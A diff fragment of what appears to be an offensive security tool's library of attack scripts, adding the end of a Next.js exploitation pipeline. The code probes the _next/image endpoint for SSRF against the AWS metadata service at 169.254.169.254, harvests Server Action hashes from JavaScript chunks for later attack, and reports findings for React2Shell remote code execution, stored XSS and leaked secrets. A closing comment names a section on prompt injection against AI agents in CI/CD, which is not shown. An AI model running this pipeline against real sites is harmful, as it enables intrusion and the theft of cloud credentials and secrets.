+print("\n[Phase 5] _next/image SSRF probe...")
+import urllib.parse
+meta_url = urllib.parse.quote("http://169.254.169.254/latest/meta-data/", safe="")
+img_r = session.get(f"{{TARGET}}/_next/image?url={{meta_url}}&w=32&q=10", headers=H, timeout=10)
+results["ssrf"] = img_r.status_code == 200 and len(img_r.content) > 100
+print(f"  AWS metadata via _next/image: [{{img_r.status_code}}] — "
+      f"{{'SSRF CONFIRMED!' if results['ssrf'] else 'blocked/not reachable'}}")
+
+# ── Phase 6: Server Action discovery ─────────────────────────────────────────
+print("\n[Phase 6] Next-Action hash discovery...")
+js_chunks = list(set(re.findall(r'/_next/static/(?:chunks/)?[\w\-.]+\.js', resp.text)))
+action_hashes = set()
+for chunk in js_chunks[:20]:
+    r_c = session.get(f"{{TARGET}}{{chunk}}", headers=H, timeout=8)
+    if r_c.status_code == 200:
+        hashes = re.findall(r'["\']([0-9a-f]{40})["\']', r_c.text)
+        action_hashes.update(hashes)
+results["actions"] = list(action_hashes)
+print(f"  Action hashes found: {{len(results['actions'])}}")
+if results["actions"]:
+    print(f"  Sample: {{results['actions'][0]}}")
+    print(f"  Test these with: nextjs-server-action skill")
+
+# ── Summary ───────────────────────────────────────────────────────────────────
+print("\n" + "=" * 70)
+print("[PIPELINE COMPLETE] Summary:")
+print(f"  React2Shell RCE:   {{'VULNERABLE' if results['react2shell'] else 'Not detected'}}")
+print(f"  0-click SXSS:      {{'POSSIBLE' if results['sxss'] else 'Not detected'}}")
+print(f"  SSR Data Leak:     {{len(results['data_leak'])}} secrets in __NEXT_DATA__")
+print(f"  Image SSRF:        {{'CONFIRMED' if results['ssrf'] else 'Not detected'}}")
+print(f"  Server Actions:    {{len(results['actions'])}} action hashes found")
+
+if results["react2shell"]:
+    print(f"\n  ⚠️  CRITICAL: React2Shell (CVE-2025-55182) detected — immediate patching required!")
+''',
     },
 
     # ── AI Agent CI/CD Prompt Injection Supply Chain (v3.2.66) ────────────────────
